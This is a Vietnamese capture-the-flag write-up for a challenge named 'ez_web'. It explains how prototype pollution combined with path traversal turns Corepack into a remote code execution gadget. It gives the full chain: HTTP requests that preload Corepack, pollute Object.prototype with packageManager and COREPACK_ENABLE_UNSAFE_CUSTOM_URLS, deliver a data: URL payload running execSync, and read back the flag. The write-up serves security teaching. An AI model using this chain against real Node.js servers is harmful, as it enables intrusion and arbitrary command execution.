# Corepack RCE via Prototype-Polluted packageManager

Đọc phần phân tích chính ở: [ez_web](./writeup.md)

Từ phần trước, ta đã có `/change-theme` để ghi dữ liệu lên `Object.prototype` và `/member` để require một file `.js` ngoài thư mục `members`. Với hai mảnh này, một hướng khác có thể thử là Corepack, vì nó có flow đọc `packageManager` của project trước khi tải và chạy package manager tương ứng.

## Corepack as the Gadget

Nhìn vào `Dockerfile`, ta thấy container cài Node.js thông qua NodeSource:

```dockerfile
RUN apt-get update && apt-get install -y curl ca-certificates gcc && \
    curl -fsSL https://deb.nodesource.com/setup_22.x | bash - && \
    apt-get install -y nodejs
```

Trong image của challenge, cách cài này để lại Corepack trong global node modules:

```text
/usr/lib/node_modules/corepack/dist/corepack.js
/usr/lib/node_modules/corepack/dist/npm.js
```

Package manager là công cụ dùng để cài dependency và chạy package trong project, ví dụ như `npm`, `yarn` hoặc `pnpm`. Field `packageManager` trong `package.json` cho biết project muốn dùng package manager nào và version nào.

File đáng chú ý ở đây là `corepack/dist/npm.js`, entrypoint do Corepack cung cấp cho lệnh `npm`:

```js
process.env.COREPACK_ENABLE_DOWNLOAD_PROMPT??='1'
require('module').enableCompileCache?.();
require("./lib/corepack.cjs").runMain(["npm", ...process.argv.slice(2)]);
```

File `npm.js` không tự xử lý logic của npm. Khi được load, nó gọi `corepack.cjs` với `runMain(["npm", ...])`. Giá trị `"npm"` cho Corepack biết request hiện tại đang đi qua lệnh `npm`, rồi Corepack chuyển vào flow tìm package manager của project. Trong flow đó, Corepack đọc `package.json` và lấy field `packageManager` để quyết định phiên bản cần tải/chạy.

### Inherited packageManager Lookup

Trong bản Corepack có trong image, một trong các nguồn được đọc là field `packageManager` trên object được parse từ `package.json`. Phần liên quan nằm trong `/usr/lib/node_modules/corepack/dist/lib/corepack.cjs`.

Ở `loadSpecAndEnv()`, Corepack kiểm tra xem object `data` đọc từ `package.json` có `packageManager` hay không:

```js
while (nextCwd !== currCwd && (!selection || !selection.data.packageManager)) {
  ...
}

const { packageManagerField, devEnginesPackageManager } = parsePackageJSON(selection.data);
```

Sau đó `parsePackageJSON()` lấy field này bằng destructuring:

```js
function parsePackageJSON(packageJSONContent) {
  const { packageManager: pm } = packageJSONContent;
  ...
  return { packageManagerField: pm };
}
```

Đoạn này lấy `packageManager` thẳng từ object, không kiểm tra property đó có nằm trực tiếp trên object hay không. Vì vậy nếu object được parse từ `package.json` không có sẵn `packageManager`, JavaScript vẫn có thể lấy giá trị kế thừa từ `Object.prototype`.

Vì vậy, nếu ghi được:

```js
Object.prototype.packageManager = "<controlled-value>";
```

thì Corepack có thể đọc `<controlled-value>` như field `packageManager` của project hiện tại.

### Enabling Unsafe Custom URLs

Corepack cho phép `packageManager` có dạng:

```text
npm@https://example.com/payload.js
```

Tuy nhiên với các package manager quen thuộc như `npm`, `yarn`, `pnpm`, Corepack mặc định không cho dùng URL custom. Check này nằm trong `parseSpec()`:

```js
const isURL = URL.canParse(range);

if (!isURL) {
  ...
} else if (isSupportedPackageManager(name2) && process.env.COREPACK_ENABLE_UNSAFE_CUSTOM_URLS !== `1`) {
  throw new import_clipanion4.UsageError(...);
}
```

Đoạn check này chỉ nhìn vào giá trị của `process.env.COREPACK_ENABLE_UNSAFE_CUSTOM_URLS`. Trong challenge, app không set sẵn key này, nên nếu ta ghi nó lên `Object.prototype`, lần đọc trên vẫn có thể trả về `"1"` thông qua prototype chain.

Vì vậy ta cần ghi thêm:

```js
Object.prototype.COREPACK_ENABLE_UNSAFE_CUSTOM_URLS = "1";
```

Khi đó check custom URL không còn chặn `npm@<url>` nữa.

### Payload from a data: URL

Sau khi parse xong descriptor, Corepack resolve package manager rồi đi tới `ensurePackageManager()` và `runVersion()`:

```js
const resolved = await this.resolveDescriptor(descriptor, { allowTags: true });
const installSpec = await this.ensurePackageManager(resolved);
return await runVersion(resolved, installSpec, binaryName, args);
```

Để không cần host file bên ngoài, ta có thể dùng `data:` URL. Node `fetch()` hỗ trợ scheme này, còn Corepack vẫn parse URL bằng `new URL()` và kiểm tra extension trên `pathname`.

Trong hàm `download()`, nếu URL có đuôi `.js`, Corepack sẽ lưu response thành một file JavaScript:

```js
const parsedUrl = new URL(url);
const ext = import_path3.default.posix.extname(parsedUrl.pathname);

if (ext === `.tgz`) {
  ...
} else if (ext === `.js`) {
  outputFile = import_path3.default.join(tmpFolder, import_path3.default.posix.basename(parsedUrl.pathname));
  sendTo = import_fs4.default.createWriteStream(outputFile);
}
```

Sau đó `runVersion()` chọn file `.js` vừa lưu làm `binPath` rồi chạy nó bằng `module.runMain()`:

```js
const bin = installSpec.bin ?? installSpec.spec.bin;
if (Array.isArray(bin)) {
  if (bin.some((name2) => name2 === binName)) {
    const parsedUrl = new URL(installSpec.spec.url);
    const ext = import_path3.default.posix.extname(parsedUrl.pathname);
    if (ext === `.js`) {
      binPath = import_path3.default.join(installSpec.location, import_path3.default.posix.basename(parsedUrl.pathname));
    }
  }
}

process.argv = [
  process.execPath,
  binPath,
  ...args
];
process.nextTick(import_module.default.runMain, binPath);
```

Với dạng single JS file này, `bin` có thể khớp với binary đang được gọi là `npm`, nên Corepack lấy basename của URL làm file cần chạy.

Như vậy nếu làm cho `packageManager` trỏ tới một `data:` URL có đuôi `.js`, Corepack sẽ fetch nội dung từ URL đó, lưu thành file JavaScript trong cache rồi chạy file này.

Payload JavaScript ta muốn chạy là:

```js
require("child_process").execSync("/readflag > /tmp/ducdev.js; sleep 60")//.js
```

Command này gọi `/readflag` rồi ghi output vào `/tmp/ducdev.js`.

Phần `//.js` ở cuối có hai tác dụng. Khi nằm trong URL, nó làm `pathname` kết thúc bằng `.js`, nên Corepack đi vào nhánh xử lý single JS file. Nhưng khi payload được fetch và chạy như JavaScript, phần sau `//` chỉ là comment nên không ảnh hưởng tới code chính.

Sau khi URL-encode payload, giá trị `packageManager` có dạng:

```text
npm@data:application/javascript,require('child_process').execSync('%2Freadflag%20%3E%20%2Ftmp%2Fducdev.js%3B%20sleep%2060')%2F%2F.js
```

Khi Corepack xử lý giá trị này, flow rút gọn sẽ là:

```text
corepack/dist/npm.js
  -> corepack.cjs
  -> đọc packageManager từ project
  -> fetch data: URL
  -> lưu payload thành file .js trong Corepack cache
  -> chạy file .js đó
```

Do payload gọi `/readflag` và redirect output vào `/tmp/ducdev.js`, đến đây ta đã có RCE.

### Preloading Corepack Before Pollution

Trước khi ghi các property độc hại lên `Object.prototype`, ta load Corepack một lần trong trạng thái prototype còn sạch:

```http
GET /member?memberID=../../usr/lib/node_modules/corepack/dist/corepack
```

Bước này không nhằm chạy payload. Mục tiêu là để entrypoint `corepack/dist/corepack.js` require thành công phần lõi `corepack.cjs`, từ đó module này được giữ lại trong `require.cache`.

Lý do cần preload là giai đoạn khởi tạo bundle của Corepack có một số helper duyệt object bằng `for...in`. Nếu prototype đã bị pollute trước đó, các helper này có thể nhìn thấy inherited properties như `packageManager` hoặc `COREPACK_ENABLE_UNSAFE_CUSTOM_URLS` và crash trước khi flow đi tới đoạn xử lý package manager.

Sau khi `corepack.cjs` đã nằm trong cache, ta mới pollute prototype rồi trigger `corepack/dist/npm.js`. Entry point `npm.js` vẫn gọi `./lib/corepack.cjs`, nhưng Node sẽ trả về module đã cache thay vì chạy lại phần khởi tạo dễ lỗi. Nhờ vậy flow có thể đi tiếp tới đoạn đọc `packageManager` và xử lý payload.

## Full Exploit Chain

Tới đây thì ta đã có đủ các mảnh của chain: `/member` để load Corepack, `/change-theme` để ghi property lên `Object.prototype`, và `packageManager` để đưa payload JavaScript vào Corepack.

Trước khi pollute prototype, ta truy cập `/member` bằng session bình thường để load `corepack.cjs` vào `require.cache`:

```http
GET /member?memberID=../../usr/lib/node_modules/corepack/dist/corepack
```

Sau đó, ở bước pollute, ta cần ghi hai property lên `Object.prototype`. Đầu tiên là `COREPACK_ENABLE_UNSAFE_CUSTOM_URLS` để Corepack cho phép dùng URL custom:

```text
themeVar=COREPACK_ENABLE_UNSAFE_CUSTOM_URLS
themeVal=1
```

![Writing `COREPACK_ENABLE_UNSAFE_CUSTOM_URLS` to the prototype](./assets/corepack-repeater-enable-custom-urls.png)

Tiếp theo là `packageManager`. Giá trị của property này là một `data:` URL chứa payload JavaScript đã được URL-encode:

```text
themeVar=packageManager
themeVal=npm@data:application/javascript,<urlencoded-js-payload>
```

Phần JavaScript sau khi decode sẽ chạy command:

```bash
/readflag > /tmp/ducdev.js; sleep 60
```

![Writing `packageManager` with a data: URL payload](./assets/corepack-repeater-package-manager.png)

Sau khi hai request trên trả về `Change theme successfuly`, prototype đã có đủ dữ liệu mà Corepack cần đọc. Lúc này ta truy cập route `/member` để trigger `require()` tới `corepack/dist/npm`:

```http
GET /member?memberID=../../usr/lib/node_modules/corepack/dist/npm
```

Request này làm server load `corepack/dist/npm.js`. Corepack đọc `packageManager` từ prototype, tải payload từ `data:` URL, lưu thành file `.js` trong cache rồi chạy file đó. Kết quả là `/readflag` được gọi và output được ghi vào `/tmp/ducdev.js`.

Cuối cùng, đọc lại file vừa ghi cũng thông qua route `/member`:

```http
GET /member?memberID=../../tmp/ducdev
```

File `/tmp/ducdev.js` lúc này chỉ chứa raw flag, không phải JavaScript hợp lệ. Khi route `/member` gọi `require()` tới file này, Node cố compile nó như một module `.js`, gặp syntax error và error page in ra dòng đầu của file.

![Read `/tmp/ducdev.js`](./assets/browser-read-ducdev.png)

## References

- [Node.js - Corepack](https://nodejs.org/api/corepack.html)
- [Node.js - packageManager field](https://nodejs.org/api/packages.html#packagemanager)
- [nodejs/corepack](https://github.com/nodejs/corepack)
